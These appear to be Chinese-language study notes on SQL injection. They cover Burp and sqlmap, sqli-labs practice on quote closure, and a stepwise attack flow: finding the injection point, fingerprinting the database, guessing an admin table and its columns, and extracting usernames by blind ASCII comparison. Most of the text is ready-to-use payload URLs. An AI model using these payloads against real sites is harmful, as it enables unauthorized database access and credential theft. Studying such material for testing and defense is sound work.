#### 自动化注入

半自动化注入

1. burp

全自动注入

1. sqlmap
1. 定制化脚本

#### sql-lib

1. 字符型注入，链接后加入?id=1'，如果页面有关于1的错误显示，说明是字符型注入；可以尝试更换数字，更换双引号测试；通过报错信息确认闭合方式

   闭合方式：单引号；格式：?id=1'  --+；单引号与提交的参数1前面的单引号构成一对，做为一个闭合；--+用来注释其他无用sql语句

2. 数字型注入，判断如上，数字型注入没有闭合方式，?id=1，不用加单引号，可以直接执行注入，?id=-2 union select 1,2,database()

2. 代码审计确定注入方式和闭合方式，确认是否为布尔类型状态

#### Sql注入流程

1.  **判断是否存在注入点（数字型注入）**

    www.xxx.com/index.php?id=2' --

    www.xxx.com/index.php?id=2 and 1=1 --

    www.xxx.com/index.php?id=2 and 1=2 --

    第2条返回正常，第1、3条返回不正常说明id参数存在注入漏洞

2.  **判断数据库类型**

    可以根据不同数据库特有的表，或者根据不同数据库的语法不同来判断

    www.XXX.com/index.php?id=2 and exists(select * from sysobjects) --    返回正常是SQLServer 数据库

    www.XXX.com/index.php?id=2 and exists(select * from msysobjects) --   返回正常是Access 数据库

    www.XXX.com/index.php?id=2 and len('a') = 1 --　　返回正常是SQLServer或者MySQL

    www.XXX.com/index.php?id=2 and substring('abc','1','1') = a --　　返回正常是SQLServer

    www.XXX.com/index.php?id=2 and subStr('abc','1','1')= a --　　返回正常是Oracle

    知道是哪种类型数据库后就可以选择对应语法构造SQL语句进行攻击

3.  **判定是否存在admin表**

    www.XXX.com/index.php?id=2 and exists(select * from admin) --  返回正常 存在admin表

4.  **猜admin表中的字段名**

    www.XXX.com/index.php?id=2 and exists(select username from admin) --  返回正常 表示admin表存在username字段

5.  **猜字段值**

    www.XXX.com/index.php?id=2 and exists(select * from admin where id =1 and asc(mid(username,1,1))) < 100 -- 返回正常说明username中有ascii码小于100的字母，然后根据折半发准确判断是哪一个字符

